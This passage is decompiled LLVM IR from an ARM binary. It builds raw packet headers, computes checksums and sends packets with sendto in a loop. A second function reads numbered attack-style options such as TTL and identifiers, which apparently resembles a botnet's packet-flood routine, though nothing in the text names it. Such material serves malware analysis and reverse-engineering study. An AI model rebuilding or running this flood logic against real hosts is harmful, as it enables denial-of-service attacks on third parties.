  store i32 %v1_c800, i32* %ip.global-to-local, align 4
  %v0_cd28 = load i32, i32* @r6, align 4
  %v1_cd28 = add i32 %v0_cd28, 13
  %v2_cd28 = inttoptr i32 %v1_cd28 to i8*
  %v3_cd28 = load i8, i8* %v2_cd28, align 1
  %v4_cd28 = zext i8 %v3_cd28 to i32
  store i32 %v1_cd2c, i32* %r3.global-to-local, align 4
  %v1_cd30 = and i32 %v4_cd28, 251
  %v5_cd34 = or i32 %v1_cd30, %v4_cd34
  store i32 %v5_cd34, i32* %r2.global-to-local, align 4
  %v1_cd38 = trunc i32 %v5_cd34 to i8
  store i8 %v1_cd38, i8* %v2_cd28, align 1
  store i32 %v1_c820, i32* %r1.global-to-local, align 4
  %v0_cd40 = load i32, i32* @r6, align 4
  %v1_cd40 = add i32 %v0_cd40, 13
  %v2_cd40 = inttoptr i32 %v1_cd40 to i8*
  %v3_cd40 = load i8, i8* %v2_cd40, align 1
  %v4_cd40 = zext i8 %v3_cd40 to i32
  store i32 %v1_cd44, i32* %r2.global-to-local, align 4
  %v1_cd48 = and i32 %v4_cd40, 253
  %v4_cd4c = or i32 %v1_cd48, %v3_cd4c
  store i32 %v4_cd4c, i32* %r3.global-to-local, align 4
  %v1_cd50 = trunc i32 %v4_cd4c to i8
  store i8 %v1_cd50, i8* %v2_cd40, align 1
  %v0_cd54 = load i32, i32* @r6, align 4
  %v1_cd54 = add i32 %v0_cd54, 13
  %v2_cd54 = inttoptr i32 %v1_cd54 to i8*
  %v3_cd54 = load i8, i8* %v2_cd54, align 1
  %v4_cd54 = zext i8 %v3_cd54 to i32
  %v0_cd58 = load i32, i32* @r8, align 4
  %v1_cd58 = urem i32 %v0_cd58, 2
  %v1_cd5c = and i32 %v4_cd54, 254
  store i32 %v1_cd5c, i32* %r2.global-to-local, align 4
  %v4_cd6037 = udiv i32 %v0_ccd8, 256
  %v2_cd64 = or i32 %v1_cd5c, %v1_cd58
  store i32 %v2_cd64, i32* %r3.global-to-local, align 4
  %v1_cd68 = trunc i32 %v4_cd6037 to i8
  %v3_cd68 = add i32 %v0_cd54, 15
  %v4_cd68 = inttoptr i32 %v3_cd68 to i8*
  store i8 %v1_cd68, i8* %v4_cd68, align 1
  %v3_cd6c = load i32, i32* @r6, align 4
  %v4_cd6c = add i32 %v3_cd6c, 14
  %v5_cd6c = inttoptr i32 %v4_cd6c to i8*
  store i8 %v1_ccd8, i8* %v5_cd6c, align 1
  %v0_cd70 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd70 = trunc i32 %v0_cd70 to i8
  %v2_cd70 = load i32, i32* @r6, align 4
  %v3_cd70 = add i32 %v2_cd70, 13
  %v4_cd70 = inttoptr i32 %v3_cd70 to i8*
  store i8 %v1_cd70, i8* %v4_cd70, align 1
  %v0_cd74 = load i32, i32* @r4, align 4
  %v1_cd74 = add i32 %v0_cd74, 40
  store i32 %v1_cd74, i32* %r0.global-to-local, align 4
  %v0_cd78 = load i32, i32* @sb, align 4
  store i32 %v0_cd78, i32* @r1, align 4
  %v1_cd7c = inttoptr i32 %v1_cd74 to i8*
  %v2_cd7c = call i32 @function_f7fc(i8* %v1_cd7c)
  store i32 %v2_cd7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cd80

dec_label_pc_cd80:                                ; preds = %dec_label_pc_c8f4, %dec_label_pc_cb00, %bb97
  %v3_cd80 = load i32, i32* %stack_var_-40, align 4
  %v1_cd84 = add i32 %v3_cd80, 1
  store i32 %v1_cd84, i32* %r3.global-to-local, align 4
  %v1_cd88 = load i32, i32* @fp, align 4
  %v9_cd88 = icmp eq i32 %v1_cd84, %v1_cd88
  store i1 %v9_cd88, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cd84, i32* %stack_var_-40, align 4
  %v5_cd90 = icmp slt i32 %v1_cd84, %v1_cd88
  br i1 %v5_cd90, label %dec_label_pc_c8f4, label %dec_label_pc_cd94

dec_label_pc_cd94:                                ; preds = %dec_label_pc_cd80, %.thread27
  %v0_cd9c21 = phi i32 [ %v0_c8c8, %.thread27 ], [ %v1_cd88, %dec_label_pc_cd80 ]
  %v0_cd94 = load i32, i32* @sb, align 4
  %v1_cd94 = add i32 %v0_cd94, 40
  store i32 %v1_cd94, i32* @sl, align 4
  %v1_cd98 = add i32 %v0_cd94, 20
  store i32 %v1_cd98, i32* @r7, align 4
  %v2_cf14 = icmp eq i32 %v1_c878, 0
  %v9_cdd0 = icmp eq i32 %v3_c8d0, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  br label %dec_label_pc_cd9c

dec_label_pc_cd9c:                                ; preds = %dec_label_pc_cdf8, %dec_label_pc_cd94
  %v0_cd9c = phi i32 [ %v1_ced8, %dec_label_pc_cdf8 ], [ %v0_cd9c21, %dec_label_pc_cd94 ]
  %v2_cd9c = icmp eq i32 %v0_cd9c, 0
  store i1 %v2_cd9c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp98 = icmp slt i32 %v0_cd9c, 1
  br label %dec_label_pc_cda4

dec_label_pc_cda4:                                ; preds = %dec_label_pc_cda4, %dec_label_pc_cd9c
  br i1 %tmp98, label %dec_label_pc_cda4, label %dec_label_pc_cda8

dec_label_pc_cda8:                                ; preds = %dec_label_pc_cda4
  %v0_cda8 = load i32, i32* @r7, align 4
  %tmp99 = mul i32 %v0_cda8, 256
  %v1_cdb0 = and i32 %tmp99, 65280
  %tmp100 = udiv i32 %v0_cda8, 256
  %v4_cdb4 = urem i32 %tmp100, 256
  %v5_cdb4 = or i32 %v4_cdb4, %v1_cdb0
  store i32 %v5_cdb4, i32* @r8, align 4
  store i32 %v4_c6e8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.102 to i32), i32* %r3.global-to-local, align 4
  store i32 %v3_c8d0, i32* %ip.global-to-local, align 4
  %v7_cdc8 = load i32, i32* %v2_c6e8, align 4
  store i32 %v7_cdc8, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_cdd0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_cddc = add i32 %v7_cdc8, 20
  store i32 %v1_cddc, i32* @r5, align 4
  br i1 %v9_cdd0, label %dec_label_pc_cf04, label %dec_label_pc_cde4

dec_label_pc_cde4:                                ; preds = %dec_label_pc_cee4, %dec_label_pc_cda8
  %v0_cdf0 = phi i32 [ %v7_cef0, %dec_label_pc_cee4 ], [ %v7_cdc8, %dec_label_pc_cda8 ]
  store i1 %v2_cf14, i1* %cpsr_z.global-to-local, align 1
  %v0_cdec = load i32, i32* @sb, align 4
  store i32 %v0_cdec, i32* @r1, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 40
  store i32 %v1_cdf0, i32* %r0.global-to-local, align 4
  br i1 %v2_cf14, label %dec_label_pc_cdf8, label %dec_label_pc_cf28

dec_label_pc_cdf8:                                ; preds = %dec_label_pc_cde4, %dec_label_pc_cf04, %dec_label_pc_cf28
  %v2_cdf8 = phi i32 [ %v0_cdf0, %dec_label_pc_cde4 ], [ %v0_cf1c, %dec_label_pc_cf04 ], [ %v2_cdf8.pre, %dec_label_pc_cf28 ]
  %v0_cdf8 = load i32, i32* @r6, align 4
  %v1_cdf8 = trunc i32 %v0_cdf8 to i8
  %v3_cdf8 = add i32 %v2_cdf8, 10
  %v4_cdf8 = inttoptr i32 %v3_cdf8 to i8*
  store i8 %v1_cdf8, i8* %v4_cdf8, align 1
  %v0_cdfc = load i32, i32* @r6, align 4
  %v1_cdfc = trunc i32 %v0_cdfc to i8
  %v2_cdfc = load i32, i32* @r4, align 4
  %v3_cdfc = add i32 %v2_cdfc, 11
  %v4_cdfc = inttoptr i32 %v3_cdfc to i8*
  store i8 %v1_cdfc, i8* %v4_cdfc, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ce04 = load i32, i32* @r4, align 4
  store i32 %v0_ce04, i32* @r0, align 4
  %v2_ce08 = call i32 @function_ddf4(i32 %v0_ce04, i32 20)
  %v3_ce08 = trunc i32 %v2_ce08 to i8
  store i32 %v2_ce08, i32* %r0.global-to-local, align 4
  %v3_ce0c = load i32, i32* %stack_var_-40, align 4
  store i32 %v4_c6d8, i32* %r2.global-to-local, align 4
  %v3_ce14 = mul i32 %v3_ce0c, 16
  %v2_ce18 = add i32 %v3_ce14, %v4_c6d8
  store i32 %v2_ce18, i32* %r1.global-to-local, align 4
  %v1_ce1c = add i32 %v2_ce18, 4
  %v2_ce1c = inttoptr i32 %v1_ce1c to i32*
  %v3_ce1c = load i32, i32* %v2_ce1c, align 4
  %v3_ce20 = mul i32 %v3_ce1c, 65536
  store i32 %v3_ce20, i32* %ip.global-to-local, align 4
  %tmp101 = mul i32 %v3_ce1c, 256
  %v1_ce28 = and i32 %tmp101, 65280
  %tmp102 = udiv i32 %v3_ce1c, 256
  %v4_ce2c = urem i32 %tmp102, 256
  %v5_ce2c = or i32 %v4_ce2c, %v1_ce28
  store i32 %v5_ce2c, i32* %r2.global-to-local, align 4
  %v1_ce30 = add i32 %v3_ce1c, 1
  store i32 %v1_ce30, i32* %r3.global-to-local, align 4
  store i32 %v1_ce30, i32* %v2_ce1c, align 4
  %v0_ce38 = load i32, i32* %r2.global-to-local, align 4
  %v1_ce38 = load i32, i32* @r5, align 4
  %v2_ce38 = add i32 %v1_ce38, 4
  %v3_ce38 = inttoptr i32 %v2_ce38 to i32*
  store i32 %v0_ce38, i32* %v3_ce38, align 4
  %v0_ce3c = load i32, i32* %r1.global-to-local, align 4
  %v1_ce3c = add i32 %v0_ce3c, 8
  %v2_ce3c = inttoptr i32 %v1_ce3c to i32*
  %v3_ce3c = load i32, i32* %v2_ce3c, align 4
  %tmp103 = mul i32 %v3_ce3c, 256
  %v1_ce48 = and i32 %tmp103, 65280
  %tmp104 = udiv i32 %v3_ce3c, 256
  %v4_ce4c = urem i32 %tmp104, 256
  %v5_ce4c = or i32 %v4_ce4c, %v1_ce48
  store i32 %v5_ce4c, i32* %r2.global-to-local, align 4
  %v4_ce5038 = udiv i32 %v2_ce08, 256
  %v1_ce54 = trunc i32 %v4_ce5038 to i8
  %v2_ce54 = load i32, i32* @r4, align 4
  %v3_ce54 = add i32 %v2_ce54, 11
  %v4_ce54 = inttoptr i32 %v3_ce54 to i8*
  store i8 %v1_ce54, i8* %v4_ce54, align 1
  %v3_ce58 = load i32, i32* @r4, align 4
  %v4_ce58 = add i32 %v3_ce58, 10
  %v5_ce58 = inttoptr i32 %v4_ce58 to i8*
  store i8 %v3_ce08, i8* %v5_ce58, align 1
  %v0_ce5c = load i32, i32* %r2.global-to-local, align 4
  %v1_ce5c = load i32, i32* @r5, align 4
  %v2_ce5c = add i32 %v1_ce5c, 8
  %v3_ce5c = inttoptr i32 %v2_ce5c to i32*
  store i32 %v0_ce5c, i32* %v3_ce5c, align 4
  %v0_ce60 = load i32, i32* @r5, align 4
  store i32 %v0_ce60, i32* @r1, align 4
  %v0_ce64 = load i32, i32* @r8, align 4
  store i32 %v0_ce64, i32* %r2.global-to-local, align 4
  %v0_ce68 = load i32, i32* @r7, align 4
  store i32 %v0_ce68, i32* %r3.global-to-local, align 4
  %v0_ce6c = load i32, i32* @r4, align 4
  store i32 %v0_ce6c, i32* %r0.global-to-local, align 4
  %v0_ce70 = load i32, i32* @r6, align 4
  %v1_ce70 = trunc i32 %v0_ce70 to i8
  %v3_ce70 = add i32 %v0_ce60, 16
  %v4_ce70 = inttoptr i32 %v3_ce70 to i8*
  store i8 %v1_ce70, i8* %v4_ce70, align 1
  %v0_ce74 = load i32, i32* @r6, align 4
  %v1_ce74 = trunc i32 %v0_ce74 to i8
  %v2_ce74 = load i32, i32* @r5, align 4
  %v3_ce74 = add i32 %v2_ce74, 17
  %v4_ce74 = inttoptr i32 %v3_ce74 to i8*
  store i8 %v1_ce74, i8* %v4_ce74, align 1
  %v4_ce78 = call i32 @function_de50(i32 %v0_ce6c, i32 %v0_ce60, i32 %v0_ce64, i32 %v0_ce68)
  %v5_ce78 = trunc i32 %v4_ce78 to i8
  store i32 %v4_ce78, i32* %r0.global-to-local, align 4
  %v4_ce7c39 = udiv i32 %v4_ce78, 256
  %v1_ce80 = trunc i32 %v4_ce7c39 to i8
  %v2_ce80 = load i32, i32* @r5, align 4
  %v3_ce80 = add i32 %v2_ce80, 17
  %v4_ce80 = inttoptr i32 %v3_ce80 to i8*
  store i8 %v1_ce80, i8* %v4_ce80, align 1
  %v3_ce84 = load i32, i32* @r5, align 4
  %v4_ce84 = add i32 %v3_ce84, 16
  %v5_ce84 = inttoptr i32 %v4_ce84 to i8*
  store i8 %v5_ce78, i8* %v5_ce84, align 1
  %v3_ce88 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ce88, i32* %r3.global-to-local, align 4
  %v0_ce8c = load i32, i32* @r4, align 4
  %v1_ce8c = add i32 %v0_ce8c, 20
  %v2_ce8c = inttoptr i32 %v1_ce8c to i32*
  %v3_ce8c = load i32, i32* %v2_ce8c, align 4
  %v5_ce94 = mul i32 %v3_ce88, 24
  %v3_ce9c = udiv i32 %v3_ce8c, 65536
  store i32 %v3_ce9c, i32* %r2.global-to-local, align 4
  %v2_cea0 = add i32 %v5_ce94, %arg2
  store i32 %v2_cea0, i32* %ip.global-to-local, align 4
  %v3_cea47 = udiv i32 %v3_ce8c, 16777216
  %v1_cea8 = trunc i32 %v3_cea47 to i8
  %v3_cea8 = add i32 %v2_cea0, 3
  %v4_cea8 = inttoptr i32 %v3_cea8 to i8*
  store i8 %v1_cea8, i8* %v4_cea8, align 1
  %v0_ceac = load i32, i32* %r2.global-to-local, align 4
  %v1_ceac = trunc i32 %v0_ceac to i8
  %v2_ceac = load i32, i32* %ip.global-to-local, align 4
  %v3_ceac = add i32 %v2_ceac, 2
  %v4_ceac = inttoptr i32 %v3_ceac to i8*
  store i8 %v1_ceac, i8* %v4_ceac, align 1
  %v0_ceb0 = load i32, i32* @r4, align 4
  store i32 %v0_ceb0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c888, i32* %r0.global-to-local, align 4
  %v0_cebc = load i32, i32* @sl, align 4
  store i32 %v0_cebc, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_cec4 = load i32, i32* %ip.global-to-local, align 4
  %v4_cec4 = inttoptr i32 %v0_cec4 to %sockaddr*
  %v7_cecc = inttoptr i32 %v0_ceb0 to i32*
  %v9_cecc = call i32 @sendto(i32 %v3_c888, i32* %v7_cecc, i32 %v0_cebc, i32 16384, %sockaddr* %v4_cec4, i32 16)
  %v3_ced0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ced0, i32* %r3.global-to-local, align 4
  %v1_ced4 = add i32 %v3_ced0, 1
  store i32 %v1_ced4, i32* %r0.global-to-local, align 4
  %v1_ced8 = load i32, i32* @fp, align 4
  %v9_ced8 = icmp eq i32 %v1_ced4, %v1_ced8
  store i1 %v9_ced8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ced4, i32* %stack_var_-40, align 4
  %v6_cee0 = icmp slt i32 %v1_ced4, %v1_ced8
  br i1 %v6_cee0, label %dec_label_pc_cee4, label %dec_label_pc_cd9c

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cdf8
  store i32 %v4_c6e8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.102 to i32), i32* %r3.global-to-local, align 4
  store i32 %v3_c8d0, i32* %ip.global-to-local, align 4
  %v4_cef0 = mul i32 %v1_ced4, 4
  %v5_cef0 = add i32 %v4_cef0, %v4_c6e8
  %v6_cef0 = inttoptr i32 %v5_cef0 to i32*
  %v7_cef0 = load i32, i32* %v6_cef0, align 4
  store i32 %v7_cef0, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i1 %v9_cdd0, i1* %cpsr_z.global-to-local, align 1
  %v1_cefc = add i32 %v7_cef0, 20
  store i32 %v1_cefc, i32* @r5, align 4
  br i1 %v9_cdd0, label %dec_label_pc_cf04, label %dec_label_pc_cde4

dec_label_pc_cf04:                                ; preds = %dec_label_pc_cee4, %dec_label_pc_cda8
  %v0_cf04 = call i32 @function_f67c()
  %v1_cf04 = trunc i32 %v0_cf04 to i8
  %v4_cf08 = sdiv i32 %v0_cf04, 256
  store i32 %v4_cf08, i32* %r3.global-to-local, align 4
  %v3_cf0c = load i32, i32* @r4, align 4
  %v4_cf0c = add i32 %v3_cf0c, 4
  %v5_cf0c = inttoptr i32 %v4_cf0c to i8*
  store i8 %v1_cf04, i8* %v5_cf0c, align 1
  store i1 %v2_cf14, i1* %cpsr_z.global-to-local, align 1
  %v0_cf18 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf18 = trunc i32 %v0_cf18 to i8
  %v2_cf18 = load i32, i32* @r4, align 4
  %v3_cf18 = add i32 %v2_cf18, 5
  %v4_cf18 = inttoptr i32 %v3_cf18 to i8*
  store i8 %v1_cf18, i8* %v4_cf18, align 1
  %v0_cf1c = load i32, i32* @r4, align 4
  %v1_cf1c = add i32 %v0_cf1c, 40
  store i32 %v1_cf1c, i32* %r0.global-to-local, align 4
  %v0_cf20 = load i32, i32* @sb, align 4
  store i32 %v0_cf20, i32* @r1, align 4
  %v0_cf24 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cf24, label %dec_label_pc_cdf8, label %dec_label_pc_cf28

dec_label_pc_cf28:                                ; preds = %dec_label_pc_cde4, %dec_label_pc_cf04
  %v0_cf28 = phi i32 [ %v1_cdf0, %dec_label_pc_cde4 ], [ %v1_cf1c, %dec_label_pc_cf04 ]
  %v1_cf28 = inttoptr i32 %v0_cf28 to i8*
  %v2_cf28 = call i32 @function_f7fc(i8* %v1_cf28)
  store i32 %v2_cf28, i32* %r0.global-to-local, align 4
  %v2_cdf8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cdf8

; uselistorder directives
  uselistorder i32 %v0_cf1c, { 1, 0 }
  uselistorder i32 %v7_cef0, { 1, 2, 0 }
  uselistorder i32 %v1_ced8, { 1, 2, 0 }
  uselistorder i32 %v1_ced4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_ce78, { 0, 2, 1 }
  uselistorder i32 %v0_ce60, { 1, 0, 2 }
  uselistorder i32 %v3_ce3c, { 1, 0 }
  uselistorder i32 %v3_ce1c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_ce08, { 0, 2, 1 }
  uselistorder i32 %v0_cdf0, { 1, 0 }
  uselistorder i32 %v0_cda8, { 1, 0 }
  uselistorder i32 %v0_cd9c, { 1, 0 }
  uselistorder i1 %v9_cdd0, { 1, 0, 2, 3 }
  uselistorder i1 %v2_cf14, { 2, 1, 0 }
  uselistorder i32 %v1_cd84, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ccd8, { 0, 2, 1 }
  uselistorder i32 %v3_ccb8, { 1, 0 }
  uselistorder i32 %v0_cc8c, { 1, 0, 2 }
  uselistorder i32 %v3_cc80, { 1, 0 }
  uselistorder i32 %v1_cbe4, { 1, 0 }
  uselistorder i32 %v0_cbd8, { 1, 2, 0 }
  uselistorder i32 %v3_cb9c, { 1, 0 }
  uselistorder i32 %v2_cb88, { 1, 0 }
  uselistorder i32 %v3_cb6c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_cb64, { 1, 0 }
  uselistorder i32 %v3_cb40, { 1, 0, 2 }
  uselistorder i32 %v3_cb38, { 1, 0 }
  uselistorder i32 %v4_cb20, { 1, 0 }
  uselistorder i32 %v0_cb1c, { 0, 2, 1 }
  uselistorder i32 %v3_c91c, { 1, 2, 3, 0 }
  uselistorder i32 %v5_cad0, { 1, 0 }
  uselistorder i1 %v9_cab4, { 1, 0 }
  uselistorder i32 %v4_cac8, { 1, 0 }
  uselistorder i32 %v4_cac4, { 1, 0 }
  uselistorder i32 %storemerge35, { 0, 2, 1 }
  uselistorder i32 %v8_c9bc, { 1, 2, 0, 3 }
  uselistorder i32 %v3_c9a8, { 1, 0 }
  uselistorder i32 %v7_c974, { 4, 1, 3, 0, 2, 5 }
  uselistorder i32 %v1_cd44, { 1, 0 }
  uselistorder i32 %v1_cd2c, { 1, 0 }
  uselistorder i32 %v1_cd14, { 1, 0 }
  uselistorder i32 %v1_ccfc, { 1, 0 }
  uselistorder i32 %v1_cce4, { 1, 0 }
  uselistorder i32 %v5_cacc, { 1, 0 }
  uselistorder i32 %v3_ca04113, { 1, 0 }
  uselistorder i1 %v2_cae4, { 1, 0 }
  uselistorder i32 %v1_cae0, { 1, 0 }
  uselistorder i32 %v4_cadc, { 2, 0, 1 }
  uselistorder i32 %v4_cac0, { 1, 0 }
  uselistorder i32 %v1_c900, { 2, 1, 0 }
  uselistorder i32 %v8_c8dc, { 2, 1, 0 }
  uselistorder i32 %v8_c8d8, { 1, 2, 0 }
  uselistorder i32 %v3_c8d0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_c8cc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_c88c, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v3_c888, { 3, 4, 1, 2, 5, 6, 0, 7, 8 }
  uselistorder i32 %v1_c878, { 1, 0 }
  uselistorder i32 %v1_c820, { 1, 0 }
  uselistorder i32 %v1_c800, { 1, 0 }
  uselistorder i32 %v1_c7e0, { 1, 0 }
  uselistorder i32 %v1_c7c0, { 1, 0 }
  uselistorder i32 %v1_c7a0, { 1, 0 }
  uselistorder i32 %v1_c768, { 1, 0 }
  uselistorder i32 %v4_c6e8, { 0, 3, 4, 1, 2 }
  uselistorder i32 %v4_c6d8, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32 %v1_c6bc, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 1, 16, 15 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 49, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 66, 50, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 67 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 30, 19, 20, 26, 21, 22, 23, 24, 25, 27, 28, 29, 49, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 43, 45, 44, 46, 48, 47, 50 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 5, 4, 9, 6, 7, 10, 8, 19, 11, 12, 13, 14, 15, 16, 17, 18, 23, 20, 21, 22, 24, 26, 25, 44, 41, 27, 30, 28, 31, 32, 29, 34, 33, 35, 36, 37, 39, 38, 40, 64, 63, 42, 43, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 65 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11, 13, 23, 14, 15, 16, 18, 0, 19, 20, 17, 21, 22, 27, 24, 25, 26 }
  uselistorder i32 768, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_cf28, { 1, 0 }
  uselistorder label %dec_label_pc_cdf8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cd80, { 2, 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %dec_label_pc_cb14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ca4c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_c9e0, { 1, 0 }
  uselistorder label %dec_label_pc_c92c, { 1, 0 }
}

define i32 @function_cf34(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_cf34:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_cf34 = load i32, i32* @r4, align 4
  %v1_cf38 = urem i32 %arg1, 256
  store i32 %v1_cf38, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_cf50 = urem i32 %arg3, 256
  store i32 %v1_cf50, i32* @r4, align 4
  %v2_cf54 = call i32* @calloc(i32 %v1_cf38, i32 4)
  %v4_cf54 = ptrtoint i32* %v2_cf54 to i32
  %v0_cf58 = load i32, i32* @r5, align 4
  store i32 %v0_cf58, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cf68 = load i32, i32* @r4, align 4
  %v5_cf6c = inttoptr i32 %v0_cf58 to i32*
  %v6_cf6c = call i32 @function_92dc(i32 %v0_cf68, i32* %v5_cf6c, i32 2, i32 0)
  %v1_cf78 = urem i32 %v6_cf6c, 256
  store i32 %v1_cf78, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_cf84 = load i32, i32* @r5, align 4
  store i32 %v0_cf84, i32* %r1.global-to-local, align 4
  %v0_cf88 = load i32, i32* @r4, align 4
  %v5_cf8c = trunc i32 %v6_cf6c to i8
  %v6_cf90 = inttoptr i32 %v0_cf84 to i32*
  %v7_cf90 = call i32 @function_92dc(i32 %v0_cf88, i32* %v6_cf90, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_cf94 = load i32, i32* @r5, align 4
  store i32 %v0_cf94, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_cf90, i32* @r8, align 4
  %v0_cfa4 = load i32, i32* @r4, align 4
  %v4_cfa8 = inttoptr i32 %v0_cf94 to i32*
  %v5_cfa8 = call i32 @function_92dc(i32 %v0_cfa4, i32* %v4_cfa8, i32 4, i32 64)
  %v1_cfb0 = urem i32 %v5_cfa8, 256
  store i32 %v1_cfb0, i32* %ip.global-to-local, align 4
  %v0_cfb4 = load i32, i32* @r5, align 4
  store i32 %v0_cfb4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_cfc0 = load i32, i32* @r4, align 4
  %v6_cfc8 = inttoptr i32 %v0_cfb4 to i32*
  %v7_cfc8 = call i32 @function_92dc(i32 %v0_cfc0, i32* %v6_cfc8, i32 5, i32 0)
  %v1_cfd4 = urem i32 %v7_cfc8, 256
  store i32 %v1_cfd4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cfe0 = load i32, i32* @r5, align 4
  store i32 %v0_cfe0, i32* %r1.global-to-local, align 4
  %v0_cfe4 = load i32, i32* @r4, align 4
  %v5_cfec = inttoptr i32 %v0_cfe0 to i32*
  %v6_cfec = call i32 @function_92dc(i32 %v0_cfe4, i32* %v5_cfec, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_cff4 = load i32, i32* @r5, align 4
  store i32 %v0_cff4, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_cfec, i32* @r7, align 4
  %v0_d004 = load i32, i32* @r4, align 4
  %v4_d008 = inttoptr i32 %v0_cff4 to i32*
  %v5_d008 = call i32 @function_92dc(i32 %v0_d004, i32* %v4_d008, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1))
  %v0_d010 = load i32, i32* @r5, align 4
  store i32 %v0_d010, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_d008, i32* @r6, align 4
  %v0_d020 = load i32, i32* @r4, align 4
  %v4_d024 = inttoptr i32 %v0_d010 to i32*
